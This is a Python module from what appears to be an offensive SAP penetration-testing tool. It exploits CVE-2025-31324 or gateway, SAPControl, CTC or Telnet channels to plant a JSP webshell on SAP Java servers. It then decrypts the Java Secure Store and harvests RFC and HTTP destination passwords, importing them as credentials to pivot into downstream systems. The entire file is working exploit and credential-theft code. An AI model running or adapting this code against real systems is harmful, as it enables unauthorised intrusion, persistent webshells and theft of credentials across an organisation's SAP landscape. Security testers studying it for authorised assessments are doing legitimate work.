#!/usr/bin/env python3
"""Java Secure Store extraction — server-side decrypt via dropped JSP.

Extracted from modules/exploitation/sapmap_exploit.py.  The single
public name `extract_java_secstore` is re-exported from sapmap_exploit
so existing callers continue to work unchanged.

Module-level imports cover every helper defined in sapmap_exploit
BEFORE the re-export point at line ~1843:

  execute_gw_command, execute_cve_2025_31324_via_shell,
  drop_cve_2025_31324_shell, _resolve_java_admin_creds,
  _telnet_deploy_available, _ctc_deploy_available,
  _deploy_jsp_via_ctc, _deploy_jsp_via_telnet,
  create_user_java,
  _is_ipv4, _hostname_matches, _find_node_by_host_flex,
  _probe_and_add_host, _build_java_os_exec,
  offline_decrypt_secstore

Two helpers defined LATER in sapmap_exploit are lazy-imported inside
extract_java_secstore on first call:

  _java_jsp_target_path  (line ~3322)
  _deploy_jsp_via_gw     (line ~3334)
"""
from __future__ import annotations

import logging
import os
import re

from sapmap_models import (
    SAPNode, SAPMAPState, Credentials, Finding, Severity, RFCConnection,
    InstanceInfo,
)
from sapmap_errors import format_rfc_exception
from sapmap_exploit import (
    execute_gw_command,
    execute_cve_2025_31324_via_shell,
    drop_cve_2025_31324_shell,
    _resolve_java_admin_creds,
    _telnet_deploy_available,
    _ctc_deploy_available,
    _deploy_jsp_via_ctc,
    _deploy_jsp_via_telnet,
    create_user_java,
    _is_ipv4,
    _hostname_matches,
    _find_node_by_host_flex,
    _probe_and_add_host,
    _build_java_os_exec,
    offline_decrypt_secstore,
)

logger = logging.getLogger(__name__)


def extract_java_secstore(node: SAPNode, state: SAPMAPState) -> dict:
    """Extract + decrypt the Java Secure Store on `node`, auto-plot any
    downstream ABAP systems we discover credentials for, and import those
    credentials into SAPMAP state.

    Uses the target's own `com.sap.security.core.server.secstorefs.SecStoreFS`
    via a dropped JSP, so all the algorithm variations (3DES / AES128 / AES256
    / whatever SAP ships next) are handled by the server itself.

    Returns dict: {success, entries_count, downstream_added, credentials_added,
                    edges_added, version, algorithm, error}.
    """
    # Lazy-imported (defined later in sapmap_exploit than this module's
    # re-export point).  Resolved on first call.
    from sapmap_exploit import _deploy_jsp_via_gw, _java_jsp_target_path

    import sap_java_secstore as _ss
    from datetime import datetime as _dt

    result = {"success": False, "entries_count": 0, "downstream_added": 0,
              "credentials_added": 0, "edges_added": 0,
              "version": "", "algorithm": "", "error": ""}

    sys_type = (node.system_type or "").upper()
    if "JAVA" not in sys_type:
        result["error"] = "Not a Java / dual-stack node"
        return result

    # 1. Get (or drop) a working JSP shell.  Reuse the plumbing
    #    create_user_java already uses — CVE-31324 preferred, GW SAPXPG
    #    fallback.  We write the secstore JSP right next to the webshell.
    #
    # Port resolution order:
    #   1. cve_2025_31324_port — ONLY if CVE-31324 is actually vulnerable
    #      (else the probe may have settled on the HTTPS port 5NN01,
    #      and HTTP requests to it get "Connection reset by peer").
    #   2. java_http service from any instance — guaranteed plain HTTP.
    #   3. java_https service — fall back to HTTPS scheme.
    #   4. 5NN00 derived from instance number — assume HTTP.
    jsp_scheme = "http"
    http_port = 0
    if node.cve_2025_31324_vulnerable:
        http_port = getattr(node, "cve_2025_31324_port", 0) or 0
        # The CVE probe records whether it used HTTPS.  Use that as
        # the authoritative source so the URL scheme matches.
        if http_port and getattr(node, "cve_2025_31324_https", False):
            jsp_scheme = "https"
    if not http_port:
        # Prefer plain HTTP — avoids cert verification headaches and
        # the "Connection reset" failure mode when the JSP probe hits
        # the TLS port unencrypted.
        for inst in node.instances:
            for p, svc in inst.ports.items():
                if svc == "java_http":
                    http_port = p; break
            if http_port: break
    if not http_port:
        # Only HTTPS port known — use https:// scheme.
        for inst in node.instances:
            for p, svc in inst.ports.items():
                if svc == "java_https":
                    http_port = p
                    jsp_scheme = "https"
                    break
            if http_port: break
    if not http_port:
        for inst in node.instances:
            try:
                nr = int(inst.instance_nr)
            except (ValueError, TypeError):
                continue
            candidate = 50000 + nr * 100
            if candidate in inst.ports:
                http_port = candidate; break
    # SAPControl pivot fallback: when Test Connection landed a
    # SAPControl OSExecute pivot on this node, the pivot's URL
    # points at 5NN13/14 — the Java HTTP port for THAT instance
    # sits at 5NN00/01.  Derives the port even when no earlier
    # scan discovered java_http (typical of firewalled Java
    # stacks the operator can only reach through Type-G).
    if not http_port:
        _sc_pivot = getattr(node, "_cached_sapcontrol_pivot", None)
        if _sc_pivot and _sc_pivot.get("url"):
            try:
                from urllib.parse import urlparse as _up
                _pu = _up(_sc_pivot["url"])
                _p = _pu.port or 0
                if 50000 <= _p <= 59999 and _p % 100 in (13, 14):
                    _inst_nr_from_pivot = (_p - 50000) // 100
                    http_port = 50000 + _inst_nr_from_pivot * 100
                    jsp_scheme = "http"
                    print(f"[+] {node.sid}: derived Java HTTP port "
                          f"{http_port} from SAPControl pivot "
                          f"{_sc_pivot['url']} (inst "
                          f"{_inst_nr_from_pivot:02d})")
            except Exception:
                pass
    if not http_port:
        result["error"] = "no Java HTTP port known for JSP deployment"
        return result
    # Derive instance from the HTTP port.  HTTPS is 5NN01, so subtract
    # one before the //100 division.
    java_inst_port = http_port - 1 if jsp_scheme == "https" else http_port
    java_inst = (java_inst_port - 50000) // 100

    # Pick delivery path (CVE-31324 > GW > SAPControl OSExecute >
    # CTC > Telnet).  SAPControl OSExecute goes after GW because
    # GW+SXPG typically reaches _deploy_jsp_via_gw's exec channel
    # too — but when neither classical vuln applies, the operator's
    # verified Type-G pivot is the intended route.
    use_cve = node.cve_2025_31324_vulnerable
    use_gw  = node.gw_vulnerable
    use_sapcontrol = (not use_cve) and (not use_gw) and bool(
        getattr(node, "_cached_sapcontrol_pivot", None))
    use_ctc    = (not use_cve) and (not use_gw) and (not use_sapcontrol) \
                    and _ctc_deploy_available(node)
    use_telnet = (not use_cve) and (not use_gw) and (not use_sapcontrol) \
                    and (not use_ctc) and _telnet_deploy_available(node)

    import base64 as _b64, random as _r, string as _s
    jsp_name = "ss" + "".join(_r.choice(_s.ascii_lowercase) for _ in range(7)) + ".jsp"
    jsp_b64 = _b64.b64encode(_ss.SECSTORE_JSP.encode("utf-8")).decode("ascii")
    target_path = _java_jsp_target_path(node, java_inst, jsp_name)
    jsp_url = (f"{jsp_scheme}://{node.ip or node.hostname}"
               f":{http_port}/irj/{jsp_name}")
    delivery = ("CVE-2025-31324" if use_cve
                else "GW SAPXPG"  if use_gw
                else "SAPControl OSExecute" if use_sapcontrol
                else "CTC ConfigServlet (UME admin)" if use_ctc
                else "Telnet (UME admin)" if use_telnet
                else "NONE")
    print(f"[*] {node.sid}: Deploying SecStore JSP via {delivery}")
    print(f"[*] {node.sid}:   JSP name      : {jsp_name}")
    print(f"[*] {node.sid}:   JSP source    : {len(_ss.SECSTORE_JSP)} bytes "
          f"({len(jsp_b64)} bytes base64)")
    print(f"[*] {node.sid}:   target path   : {target_path}")
    print(f"[*] {node.sid}:   reachable URL : {jsp_url}")

    if use_cve:
        # Ensure we have a working JSP webshell the chunked writer can use.
        # via_shell's auto-drop covers this; call a trivial cmd to force it.
        execute_cve_2025_31324_via_shell(node, "cmd.exe /C echo sapmap_prime")
        if not node.cve_2025_31324_shells:
            result["error"] = "no JSP webshell available"
            return result
        shell_url = node.cve_2025_31324_shells[-1]["url"]
        print(f"[*] {node.sid}:   write via     : CVE-31324 webshell @ "
              f"{shell_url}")
        from sap_cve_2025_31324 import write_file_via_shell
        w = write_file_via_shell(shell_url, target_path,
                                   _ss.SECSTORE_JSP.encode("utf-8"))
        if not w.get("success"):
            result["error"] = f"CVE chunked write failed: {w.get('error', '?')}"
            return result
        print(f"[+] {node.sid}:   wrote {w['chunks_written']} chunk(s) of "
              f"base64 + certutil-decoded into {target_path}")
    elif use_gw or use_sapcontrol:
        # Both channels write the JSP via the SAME chunked-echo /
        # base64-decode primitive.  The only difference is which
        # OS-exec transport the chunks travel over — GW SAPXPG (the
        # named case) vs SAPControl OSExecute (auto-selected inside
        # execute_os_command when node._cached_sapcontrol_pivot is
        # present, from commit 8387c9b).  Same helper, same call
        # site, transport picked one layer down.
        w = _deploy_jsp_via_gw(node, _ss.SECSTORE_JSP.encode("utf-8"),
                                 target_path, label="SecStore JSP")
        if not w.get("success"):
            _channel = "SAPControl OSExecute" if use_sapcontrol else "GW"
            result["error"] = w.get("error",
                                      f"{_channel} deploy failed")
            return result
        print(f"[+] {node.sid}:   wrote {w.get('bytes_written', 0)} bytes "
              f"via {w.get('method', 'gw')}")
    elif use_ctc or use_telnet:
        # Post-RECON paths both depend on a cached UME admin.  Try CTC
        # first (cheap HTTP, reuses the port we already hit for RECON),
        # fall through to Telnet if CTC is not present — important for
        # hardened targets like PI-minimum builds that have removed
        # /ctc/ConfigServlet but still run the admin console on
        # 5NN08 (reachable via SSH tunnel + telnet_override).
        attempted = []
        if use_ctc:
            attempted.append("CTC")
            r = _deploy_jsp_via_ctc(node, _ss.SECSTORE_JSP.encode("utf-8"),
                                      target_path, label="SecStore JSP")
            if r.get("success"):
                print(f"[+] {node.sid}:   wrote {r.get('bytes_written', 0)} "
                      f"bytes via {r.get('method', '?')}")
            else:
                print(f"[!] {node.sid}: CTC deploy failed: "
                      f"{r.get('error', '?')}")
                r = None
        else:
            r = None
        if (not r or not r.get("success")) and _telnet_deploy_available(node):
            attempted.append("Telnet")
            print(f"[*] {node.sid}: falling back to Telnet (UME admin) …")
            r = _deploy_jsp_via_telnet(node,
                                         _ss.SECSTORE_JSP.encode("utf-8"),
                                         target_path, label="SecStore JSP")
            if r.get("success"):
                print(f"[+] {node.sid}:   wrote {r.get('bytes_written', 0)} "
                      f"bytes via telnet method={r.get('method', '?')}")
        if not r or not r.get("success"):
            err = (r or {}).get("error", "deploy failed")
            # Remember that post-RECON deploy is not available here, so
            # the GUI can grey out data-extraction actions that depend
            # on it.  Cleared as soon as CVE-31324 / GW is discovered
            # later or deploy works on a subsequent attempt.
            node.java_deploy_blocked = True
            result["error"] = (f"all post-RECON deploy paths failed "
                                f"({'/'.join(attempted) or 'none tried'}): "
                                f"{err}")
            return result
        # A post-RECON path succeeded — clear the block.
        node.java_deploy_blocked = False
    else:
        result["error"] = ("no deployment path "
                           "(need CVE-2025-31324, GW vuln, or a UME admin "
                           "user created via RECON)")
        return result

    print(f"[+] {node.sid}: SecStore JSP at {jsp_url}")

    # Warm-up probe: same Jasper-compile race that bit
    # _ensure_java_db_jsp / deploy_create_user_jsp_via_cve_31324.
    # Without this, the very first invoke_secstore_jsp() right after
    # the chunked write returns "HTTP 404" instead of waiting the
    # second or two for Tomcat to pick up the new file.
    from sap_java_runner import _wait_for_jsp_ready
    if not _wait_for_jsp_ready(jsp_url, sid=node.sid, label="SecStore JSP"):
        result["error"] = (f"SecStore JSP at {jsp_url} never reached "
                           f"HTTP 200 after compile-window retries")
        return result

    # 2. Invoke — server decrypts with its own SecStoreFS implementation.
    r = _ss.invoke_secstore_jsp(jsp_url, node.sid)
    if not r["success"]:
        result["error"] = r["error"] or "invocation failed"
        result["raw"] = r["raw"][:500]
        return result

    print(f"[+] {node.sid}: SecStore opened — version={r['version']} "
          f"algorithm={r['algorithm'][:80]}")
    print(f"[+] {node.sid}: {len(r['entries'])} file entries, "
          f"{len(r.get('config_entries', []))} J2EE_CONFIGENTRY rows decrypted")

    node.java_secstore_checked = True
    node.java_secstore_version = r["version"]
    node.java_secstore_algorithm = r["algorithm"]

    # 3. Classify + record each entry, collect downstream targets.
    persisted = []
    downstream_plan = []   # [(target_sid, client, kind, value, entry_name)]
    local_jdbc = None
    for e in r["entries"]:
        info = _ss.classify_entry(e["name"], node.sid)
        row = {
            "name": e["name"],
            "kind": info["kind"],
            "target_sid": info["target_sid"],
            "client": info["client"],
            "is_downstream": info["is_downstream"],
            "value": e["value"],
        }
        persisted.append(row)
        if info["kind"] == "jdbc_local":
            local_jdbc = _ss.parse_jdbc_entry(e["value"])
        if info["is_downstream"]:
            downstream_plan.append((info["target_sid"], info["client"],
                                     info["kind"], e["value"], e["name"]))
    # Also pull config-entry rows into the persisted entries list so they
    # show up in the results modal alongside the file entries.  For every
    # row that belongs to a JCo destination CID, annotate with the
    # destination's name + user + target so the GUI can disambiguate
    # multiple identically-named #~jco.client.passwd entries.
    #
    # The destination metadata lives in VSTR (not VBYTES) — the SecStore
    # JSP now emits a separate CTX block keyed by CID with every cleartext
    # `#~%` row under any CID containing `#~destination.name`.  Index it.
    raw_ctx = r.get("configentry_context", {})  # {cid: {name: value}}
    cid_context = {}
    for cid, props in raw_ctx.items():
        # dest_name might live under any of these keys on different SAP
        # releases / destination types.  System destinations like
        # UMEBackendConnection often lack #~destination.name entirely
        # and must be labelled from sibling jco.client.* metadata.
        name_candidates = [
            props.get("#~destination.name", ""),
            props.get("#~destination.systemDestinationName", ""),
            props.get("#~jco.client.destination", ""),
            # HTTP destinations on older 7.0x / standalone layouts
            # store the name without the "destination." prefix.
            props.get("#~DestinationName", ""),
            props.get("#~destinationName", ""),
            props.get("#~Name", ""),
        ]
        dest_name = next((n for n in name_candidates if n), "")
        # Pull HTTP-destination metadata too — AS Java stores HTTP
        # destinations (Java-to-Java admin / monitoring / SLD / SOAP
        # proxy) in the same J2EE_CONFIGENTRY table.  Newer releases
        # (7.1+) use "#~destination.*" keys; older 7.0 / 7.00 storage
        # sometimes omits the "destination." prefix entirely, so we
        # check both.
        dest_type_raw = (props.get("#~destination.type", "")
                           or props.get("#~destination.Type", "")
                           or props.get("#~Type", ""))
        # URL fallback cascade: classic "destination.URL" keys first,
        # then a value-based scan — any property whose value starts
        # with http:// or https:// is the target URL.  SolMan 7.0
        # HTTP destinations store the URL under keys like
        # "#~Address" or even just a numeric id, so key-based lookup
        # alone misses them.
        dest_url_raw = (props.get("#~destination.URL", "")
                          or props.get("#~destination.url", "")
                          or props.get("#~URL", ""))
        if not dest_url_raw:
            for _pv in props.values():
                pv_low = (_pv or "").strip().lower()
                if pv_low.startswith(("http://", "https://")):
                    dest_url_raw = _pv.strip()
                    break
        dest_http_user = (props.get("#~destination.User", "")
                            or props.get("#~destination.Username", "")
                            or props.get("#~destination.user", "")
                            or props.get("#~User", "")
                            or props.get("#~Username", ""))
        dest_http_auth = (props.get("#~destination.authenticationType", "")
                            or props.get("#~destination.AuthenticationType", "")
                            or props.get("#~AuthenticationType", "")
                            or props.get("#~authenticationType", ""))
        dest_proxy_host = (props.get("#~destination.ProxyHost", "")
                             or props.get("#~ProxyHost", ""))
        dest_proxy_port = (props.get("#~destination.ProxyPort", "")
                             or props.get("#~ProxyPort", ""))
        # Target host — JCo destinations can use either application
        # server mode ("ashost") or message server / load-balanced mode
        # ("mshost" + optional group).  System destinations like
        # UMEBackendConnection that point at the UME's ABAP backend
        # frequently use the message-server form and leave ashost
        # empty, which previously left dest_host blank and broke the
        # host-based auto-plot.
        dest_host = (props.get("#~jco.client.ashost", "")
                      or props.get("#~jco.client.mshost", "")
                      or props.get("#~jco.client.saphost", "")
                      or "")
        # JCo "System Number" — maps directly to gateway port (33NN) and
        # dispatcher port (32NN).  Without this we default to "00" and
        # hit e.g. 3300 on a target that actually listens on 3340.
        dest_sysnr = (props.get("#~jco.client.sysnr", "")
                        or props.get("#~jco.client.systemnumber", "")
                        or "").strip()
        if dest_sysnr.isdigit():
            dest_sysnr = dest_sysnr.zfill(2)
        else:
            dest_sysnr = ""
        # Username cascade: JCo destinations use #~jco.client.user;
        # HTTP / logon destinations use #~logon.user or #~Username / #~User.
        dest_user = (props.get("#~jco.client.user", "")
                      or props.get("#~logon.user", "")
                      or props.get("#~Username", "")
                      or props.get("#~User", "")
                      or dest_http_user
                      or "")
        cid_context[cid] = {
            "dest_name":       dest_name,
            "dest_user":       dest_user,
            "dest_target_sid": ((props.get("#~jco.client.r3name", "")
                                  or props.get("#~jco.client.sysid", ""))
                                  or "").upper(),
            "dest_client":     props.get("#~jco.client.client", ""),
            "dest_host":       dest_host,
            "dest_sysnr":      dest_sysnr,
            # HTTP fields — only meaningful when dest_type == "HTTP" or
            # dest_url starts with http:// / https://
            "dest_type":       (dest_type_raw or "").upper(),
            "dest_url":        dest_url_raw,
            "dest_http_user":  dest_http_user,
            "dest_http_auth":  dest_http_auth,
            "dest_proxy":      (f"{dest_proxy_host}:{dest_proxy_port}"
                                  if dest_proxy_host and dest_proxy_port
                                  else (dest_proxy_host or "")),
        }

    # Build a per-CID bucket so we can turn each JCo-destination CID
    # (which has multiple rows: #~destination.name, #~jco.client.passwd,
    # #~jco.client.user, ...) into a single downstream_plan entry with
    # the password paired to its user/target/client metadata.
    #
    # SAP stores both "#~<name>" (active config) and "#@<name>" (factory
    # default / deploy-time value) as separate VBYTES rows per CID.  For
    # credential-hunting purposes they're redundant (same plaintext,
    # same bucket).  Suppress the "#@" variant when the "#~" sibling
    # with the same base name exists under the same CID — keeps the
    # secstore modal clean.
    active_names_by_cid = {}  # cid -> set of base names seen under "#~"
    for ce in r.get("config_entries", []):
        nm = ce.get("name", "") or ""
        if nm.startswith("#~"):
            active_names_by_cid.setdefault(ce.get("cid", ""), set()).add(nm[2:])
    suppressed_factory_dups = 0
    cid_bucket = {}        # cid -> {"password": ..., "user": ..., ...}   (RFC / JCo)
    http_bucket = {}       # cid -> {"url":..., "user":..., "password":..., "auth":...}  (HTTP)
    for ce in r.get("config_entries", []):
        # Drop factory-default "#@<name>" rows that duplicate an active
        # "#~<name>" sibling.
        nm_raw = ce.get("name", "") or ""
        if nm_raw.startswith("#@"):
            base = nm_raw[2:]
            if base in active_names_by_cid.get(ce.get("cid", ""), set()):
                suppressed_factory_dups += 1
                continue
        ctx = cid_context.get(ce.get("cid", ""), {})
        persisted.append({
            "name": ce["name"],
            "kind": "configentry",
            "target_sid": ctx.get("dest_target_sid", ""),
            "client": ctx.get("dest_client", ""),
            "is_downstream": bool(ctx.get("dest_target_sid")),
            "value": ce["value"],
            "cid": ce.get("cid", ""),
            "source": "J2EE_CONFIGENTRY",
            "dest_name":   ctx.get("dest_name", ""),
            "dest_user":   ctx.get("dest_user", ""),
            "dest_host":   ctx.get("dest_host", ""),
        })
        # HTTP destination bucket — triggered by dest_type=HTTP or
        # dest_url starting with http(s)://.  The row that has VBYTES
        # is named "#~destination.Password".  Same keyphrase decrypts
        # it as for the JCo case (ERPScan research — there's one
        # master keyphrase for the whole SecStoreFS + J2EE_CONFIGENTRY
        # store).
        cid = ce.get("cid", "")
        is_http_dest = (ctx.get("dest_type") == "HTTP"
                          or (ctx.get("dest_url", "").lower()
                                .startswith(("http://", "https://"))))
        if cid and is_http_dest:
            hb = http_bucket.setdefault(cid, {
                "name":     ctx.get("dest_name", ""),
                "url":      ctx.get("dest_url", ""),
                "user":     ctx.get("dest_http_user", ""),
                "auth":     ctx.get("dest_http_auth", ""),
                "proxy":    ctx.get("dest_proxy", ""),
                "password": "",
            })
            nm_low = (ce.get("name") or "").lower()
            # Any password-ish VBYTES row under an HTTP-dest CID is
            # the HTTP password.  Newer SAP emits it as
            # "#~destination.Password"; older 7.0x just "#~Password".
            # The is_http_dest gate above already confirmed this CID
            # is HTTP — no further qualifier needed.
            if ("password" in nm_low or "pwd" in nm_low
                    or "secret" in nm_low):
                is_active = ce["name"].startswith("#~")
                if is_active and not hb["password"].startswith("*active*"):
                    hb["password"] = "*active*" + (ce["value"] or "")
                elif (not is_active) and not hb["password"]:
                    hb["password"] = ce["value"] or ""

        # Collect per-CID password + metadata for downstream plotting.
        # Create a bucket when we have EITHER a target SID (#~jco.client.r3name)
        # OR a target host (#~jco.client.ashost).  System destinations like
        # UMEBackendConnection usually set ashost but not r3name — we
        # resolve the SID below by matching the host against existing
        # nodes on the map.
        if cid and (ctx.get("dest_target_sid") or ctx.get("dest_host")):
            b = cid_bucket.setdefault(cid, {
                "target_sid": ctx.get("dest_target_sid", ""),
                "client":     ctx.get("dest_client", ""),
                "user":       ctx.get("dest_user", ""),
                "host":       ctx.get("dest_host", ""),
                "sysnr":      ctx.get("dest_sysnr", ""),
                "name":       ctx.get("dest_name", ""),
                "password":   "",
            })
            nm = (ce["name"] or "").lower()
            # Capture the password row.  Prefer `#~jco.client.passwd` over
            # the `#@jco.client.passwd` factory-default variant (same
            # value, separately encrypted) — keep whichever we see first
            # of the `#~` form; only accept `#@` if no `#~` has landed.
            is_pw = ("passw" in nm or "pwd" in nm)
            if is_pw:
                is_active = ce["name"].startswith("#~")
                if is_active and not b["password"].startswith("*active*"):
                    # Tag with a marker we can strip below so we can tell
                    # which bucket entries came from the active row.
                    b["password"] = "*active*" + (ce["value"] or "")
                elif (not is_active) and not b["password"]:
                    b["password"] = ce["value"] or ""

    # Promote every per-CID bucket with a recovered password into the
    # downstream_plan so the auto-plot loop below sees it.  This is the
    # fix for "destinations SJ1_TO_SB6 / TEST_DEST_S4 were red in the
    # modal but never plotted as new nodes on the map".
    #
    # NOTE: we used to synthesize a JDBC-style string here and let
    # parse_jdbc_entry() re-extract user/password/host.  That lost any
    # `&` or `;` in the password (regex terminator: [^&;]*), so a
    # 40-char password ending in `&/P` came out as 37 chars.  Bypass
    # the re-parse entirely — pass an extras dict with the already-
    # clean fields straight through to the consumer.
    for cid, b in cid_bucket.items():
        # Strip the "*active*" marker used above to prefer #~ over #@
        if b["password"].startswith("*active*"):
            b["password"] = b["password"][len("*active*"):]
        if not b["password"]:
            continue

        host = (b["host"] or "").strip()
        user = (b["user"] or "SAPJSF").strip()
        client = (b["client"] or "").strip()
        if not client.isdigit():
            client = ""

        target_sid = b["target_sid"]
        # If the destination didn't set #~jco.client.r3name (typical for
        # system destinations like UMEBackendConnection), resolve the
        # SID by matching the host against existing nodes on the map.
        # Use the flex matcher so short-form (mshost "srv01sm1") and
        # FQDN ("srv01sm1.ncmi.co") reconcile.  Exclude the source SID
        # to avoid self-loops on dual-stack hosts where the Java source
        # and ABAP target share a hostname.
        if not target_sid and host:
            match = _find_node_by_host_flex(state, host,
                                                exclude_sid=node.sid)
            if match:
                target_sid = match.sid
                print(f"[*] {node.sid}: destination "
                      f"{b['name'] or cid} has no r3name, resolved "
                      f"host {host} → existing node {target_sid}")
        # If we still don't know the SID but we do know the host, probe
        # SAPControl on that host to discover it.  Hosts reachable on
        # SAPControl (1128 host-agent or 500NN3 per-instance) freely
        # return their SAPSYSTEMNAME without authentication.
        if not target_sid and host:
            target_sid = _probe_and_add_host(state, host, node.saprouter,
                                                ref=(b["name"] or cid),
                                                exclude_sid=node.sid)
        if not target_sid:
            # We have a password and possibly a host but no SID even
            # after the probe — skip auto-plotting.  Row still shows
            # up in the secstore modal with its host in "Belongs to"
            # so the operator can plot the target manually.
            if host:
                print(f"[*] {node.sid}: destination "
                      f"{b['name'] or cid} password recovered ({user}@"
                      f"{host}/{client or '?'}) but no SID known — "
                      f"SAPControl probe also failed; add the target "
                      f"host to the map manually to draw the edge")
            continue
        downstream_plan.append((
            target_sid, client,
            "jco_dest_direct",
            "",                              # no re-parsed value
            b["name"] or f"CID_{cid}",
            {"user": user, "password": b["password"], "host": host,
              "sysnr": b.get("sysnr", "")},
        ))

    # HTTP destination promotion — TEMPORARILY DISABLED.
    #
    # Current heuristic over-classifies as HTTP: any CID with a
    # value starting with http(s):// gets promoted to an HTTP
    # destination, but on SolMan 7.00 plenty of NON-destination
    # CIDs carry URL-shaped values (web-service endpoint metadata,
    # ICF service paths, internal SAP push URLs).  The result is
    # bogus edges like:
    #
    #   added HTTP edge → SM1 (dest=HTTP_-9223372036854661982,
    #     url=https://srv01sm1.ncmi.co:50001/sap/bc/srt/scs/sap/
    #     e2e_dpc_push?sap-client=001, auth=?, user=<empty>)
    #
    # …which is just an internal e2e push endpoint, not an actual
    # named destination from the destinations service.
    #
    # Bucket population stays so the HTTPDIAG / "HTTP-suggestive
    # keys" diagnostics still surface what's in J2EE_CONFIGENTRY.
    # Re-enable once we have a definitive signal for "this CID is
    # truly a named HTTP destination" — likely #~Type='HTTP' AND
    # a sibling #~Name row, or a specific ICF service path.
    import urllib.parse as _urlparse
    http_edges_planned = 0
    HTTP_PLOT_DISABLED = True   # see comment above
    for cid, hb in http_bucket.items():
        if HTTP_PLOT_DISABLED:
            continue
        if hb["password"].startswith("*active*"):
            hb["password"] = hb["password"][len("*active*"):]
        if not hb["url"]:
            continue
        # Parse the URL — we need hostname (and optionally port) to
        # match an existing node on the map.
        try:
            parsed = _urlparse.urlparse(hb["url"])
        except Exception:
            continue
        target_host = (parsed.hostname or "").strip()
        target_port = parsed.port or (443 if parsed.scheme == "https" else 80)
        if not target_host:
            continue
        # Resolve SID via host-match.  HTTP destinations often point at
        # the AS Java ICM — any Java node on the map with this hostname
        # (or its IP) is our target.  Use flex matcher for FQDN/short-
        # form reconciliation; exclude source to skip self-loops.
        target_sid = ""
        match = _find_node_by_host_flex(state, target_host,
                                            exclude_sid=node.sid)
        if match:
            target_sid = match.sid
        # SAPControl probe fallback — same as RFC destinations.
        if not target_sid:
            target_sid = _probe_and_add_host(
                state, target_host, node.saprouter,
                ref=(hb["name"] or f"HTTP_{cid}"),
                exclude_sid=node.sid)
        if not target_sid:
            # No matching node AND probe failed.  Log so the operator
            # can decide whether to add the host manually.
            cred_hint = (f"{hb['user']}:{'<set>' if hb['password'] else '<empty>'}"
                          f" via {hb['auth'] or '?'}")
            print(f"[*] {node.sid}: HTTP dest "
                  f"{hb['name'] or cid} → {hb['url']} "
                  f"({cred_hint}) — SAPControl probe on "
                  f"{target_host} failed, not auto-plotting")
            continue
        # Known target.  Draw the edge + import the cred if BASICAUTH.
        dest_label = hb["name"] or f"HTTP_{cid}"
        existing = [c for c in state.connections
                     if c.source_sid == node.sid
                        and c.target_sid == target_sid
                        and c.destination_name == dest_label]
        if existing:
            continue
        conn_kwargs = dict(
            source_sid=node.sid,
            source_host=node.hostname or node.ip,
            target_sid=target_sid,
            target_host=target_host,
            target_ip=target_host if target_host.count(".") == 3 else "",
            destination_name=dest_label,
            rfc_user=hb["user"] or "",
            client="",                           # HTTP has no client
            secstore_password=hb["password"] or "",
            conn_type="http",
            http_url=hb["url"],
            http_auth_type=(hb["auth"] or "").upper(),
            http_proxy=hb["proxy"] or "",
            tested=False, logon_tested=False,
        )
        state.add_connection(RFCConnection(**conn_kwargs))
        http_edges_planned += 1
        print(f"[+] {node.sid}: added HTTP edge → {target_sid} "
              f"(dest={dest_label}, url={hb['url']}, "
              f"auth={hb['auth'] or '?'}, user={hb['user'] or '<empty>'})")
        # Import as a Java-stack credential on the target if the
        # auth type is cleartext username/password (BASIC*) — these
        # are usable for logging into the remote Java's UME or the
        # CTC ConfigServlet / Telnet console.  client is empty
        # because Java UME doesn't have SAP clients; instance_nr is
        # borrowed from the target node so downstream logon code
        # has something to use when opening RFC etc.
        if (hb["user"] and hb["password"]
                and "BASIC" in (hb["auth"] or "").upper()):
            target_node = state.get_node(target_sid)
            if target_node:
                inst = (target_node.instance_nrs()[0]
                        if target_node.instance_nrs() else "00")
                if not any(c.username == hb["user"]
                            and c.password == hb["password"]
                            for c in target_node.credentials):
                    target_node.credentials.append(Credentials(
                        username=hb["user"], password=hb["password"],
                        client="",              # Java has no client
                        instance_nr=inst,
                        verified=False,
                    ))
                    result["credentials_added"] += 1
                    print(f"[+] {node.sid}: imported Java cred "
                          f"{hb['user']}@{target_sid} (from HTTP "
                          f"destination '{dest_label}') — try it for "
                          f"UME admin / CTC / Telnet logon")
    if http_edges_planned:
        print(f"[+] {node.sid}: {http_edges_planned} HTTP edge(s) drawn")
    # Always surface the HTTP bucket total so the operator can see
    # whether SAP stored any HTTP destinations at all.  Older 7.0
    # systems sometimes have zero HTTP destinations (JCo-only).
    http_total = len(http_bucket)
    http_with_pw = sum(1 for _, hb in http_bucket.items() if hb.get("password"))
    if http_total:
        print(f"[*] {node.sid}: HTTP-candidate CIDs found in "
              f"J2EE_CONFIGENTRY: {http_total} total, "
              f"{http_with_pw} with recovered password "
              f"(plotting disabled — heuristic over-classifies; "
              f"see code comment in extract_java_secstore)")
    else:
        # Diagnostic: show what property-name patterns DID land in
        # cid_context.  If SAP stored HTTP destinations under a
        # layout we don't yet handle, the property names will show
        # up here and we can extend the extractor.
        all_prop_names = set()
        for props in raw_ctx.values():
            all_prop_names.update(props.keys())
        # Pick the name shapes most likely to be HTTP-related
        # (contains URL, Destination, Http, User, Auth, Password).
        _http_like_re = re.compile(
            r"url|destination|http|auth|user|password|proxy|"
            r"#~[A-Z][a-zA-Z]+$",          # camelCase standalone
            re.IGNORECASE,
        )
        http_like = sorted({n for n in all_prop_names
                             if _http_like_re.search(n)})
        print(f"[*] {node.sid}: no HTTP destinations matched.  "
              f"Known property-name shapes in cid_context: "
              f"{len(all_prop_names)} total.")
        if http_like:
            print(f"[*] {node.sid}:   HTTP-suggestive keys seen: "
                  f"{', '.join(http_like[:30])}"
                  f"{' …' if len(http_like) > 30 else ''}")
        else:
            print(f"[*] {node.sid}:   no HTTP-suggestive keys at all "
                  f"(JCo-only system, or HTTP CIDs weren't pulled by "
                  f"the JSP SQL filter)")
        # Surface the table-wide HTTPDIAG: SAP rows whose NAME
        # contains URL / http / Address.  When these counts are zero
        # across the board, J2EE_CONFIGENTRY simply doesn't store
        # HTTP destinations on this kernel (very old SolMan 7.00
        # uses different storage entirely).  When non-zero, the
        # listed key names tell us exactly what to extract.
        httpdiag = r.get("httpdiag", [])
        if httpdiag:
            print(f"[*] {node.sid}:   J2EE_CONFIGENTRY URL/HTTP "
                  f"name diagnostic (top {min(len(httpdiag), 25)}):")
            for d in httpdiag[:25]:
                print(f"[*] {node.sid}:     {d['name']} "
                      f"× {d['count']}")
        else:
            print(f"[*] {node.sid}:   J2EE_CONFIGENTRY contains NO "
                  f"rows whose name matches URL/HTTP/Address — "
                  f"this kernel doesn't store HTTP destinations in "
                  f"the J2EE config table at all (SolMan 7.00 keeps "
                  f"them in RFCDES on the ABAP side).")

